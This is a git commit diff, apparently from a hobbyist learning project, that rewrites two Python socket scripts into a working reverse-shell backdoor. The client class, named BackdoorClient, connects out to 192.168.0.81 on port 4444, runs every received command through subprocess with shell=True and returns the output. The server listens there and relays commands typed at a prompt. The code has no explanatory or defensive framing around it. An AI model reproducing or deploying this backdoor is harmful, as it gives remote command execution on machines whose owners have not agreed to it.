2e1041cc235421a1258ae98e85476f8de6fdc634
brian <brinchrischo@gmail.com>
2024-01-09 23:21:48 -0500

    IT FINALLY WORKED (ooped my code)

--- rbclient.py
+++ rbclient.py
@@ -2,15 +2,33 @@
 import socket # connect to server
 import subprocess
 
-server_host = "localhost" # 192.168.0.81
+server_host = "192.168.0.81" # 192.168.0.81
 server_port = 4444
-buffer_size = 1024
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect((server_host, server_port))
+class BackdoorClient:
+    def __init__(self, server_host, server_port, buffer_size=1024):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((server_host, server_port))
+        self.server_host = server_host
+        self.server_port = server_port
+        self.buffer_size = buffer_size
+        print(f"Connected to {self.server_host}:{self.server_port}")
+    
+    def execute_order(self, command):
+        return subprocess.check_output(command, shell=True)
+    
+    def run(self):
+        while True:
+            command = self.receive_command()
+            command_output = self.execute_order(command)
+            self.send_output(command_output)
+        
+    def receive_command(self):
+        return self.connection.recv(self.buffer_size).decode()
 
-# receive the greeting message
-message = connection.recv(buffer_size).decode()
-print("Server:", message)
+    def send_output(self, output):
+        self.connection.send(output)
 
-# connection.close() # close connection
+# Creating and running the client
+client = BackdoorClient(server_host, server_port)
+client.run()
--- rbserver.py
+++ rbserver.py
@@ -1,35 +1,68 @@
 
 import socket # connect to server
 
-server_host = "localhost"
+server_host = "192.168.0.81" # 192.168.0.81
 server_port = 4444
-# 1024 bits at a time to send data over to server
 buffer_size = 1024
 
-# socket object creation
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Connection:
+    def __init__(self, server_host, server_port,buffer_size=1024):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # option that allows reuse of socket if disconnected or cuts
+        self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+        self.connection.bind((server_host, server_port))
+        # listens and accepts if client attempts to connect
+        self.connection.listen(1) # backlog
+        print(f"looking for clients as {server_host}:{server_port}")
+        self.client_socket, client_address = self.connection.accept() # self allows you to use self.connection anywhere in class
+        print(f"{client_address[0]}:{client_address[1]} Connected")
+    
+    def execute_command(self, command):
+        if command.lower() == "exit":
+            quit()
+        self.client_socket.send(command.encode())
+        return self.client_socket.recv(buffer_size).decode() # no decode because no encode clientside fix later>?>?
+    
+    def quit(self,command):
+            print("closed connection")
+            #self.client_socket.close()
+            self.connection.close()
+            
+    def run(self):
+        while True:
+            command = input("Enter a command: ")
+            result = self.execute_command(command)
+            print(result)
 
-# option that allows reuse of socket if disconnected or cuts
-connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-
-# bind socket to server IP address
-connection.bind((server_host, server_port))
+connection = Connection(server_host,server_port,buffer_size)
+connection.run()
 
 
 
-# backlog (number of connections can be queued before system refuses connections )
-connection.listen(5)
-print(f"looking for clients as {server_host}:{server_port}")
 
-# accept if client attempts to connect
-client_socket, client_address = connection.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!!! YIPEEE")
-print("connected YIPEE")
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+"""
 # just sending a message, for demonstration purposes
 message = "Hello and Welcome".encode()
 client_socket.send(message)
-
+"""
 
 
 #connection.close() # close connection
